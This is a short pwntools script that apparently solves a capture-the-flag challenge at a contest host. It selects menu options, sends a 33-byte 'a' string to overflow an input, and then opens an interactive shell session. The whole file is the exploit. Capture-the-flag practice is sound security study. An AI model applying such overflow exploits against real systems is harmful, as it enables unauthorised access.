from pwn import *

exe = ELF("./main_patched")

context.binary = exe

HOST = "playstation_hacking.chall.bytethecookies.org"
PORT = 5151

gdbscript = """
set follow-fork-mode child
"""

# args.LOCAL = True
args.DEBUG = True

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r, gdbscript=gdbscript)
    else:
        r = remote(HOST, PORT)

    return r

def main():
    r = conn()

    r.sendlineafter(b": ", b"2")
    r.sendlineafter(b": ", b"a" * 33)
    r.sendlineafter(b": ", b"4")

    r.interactive()

if __name__ == "__main__":
    main()
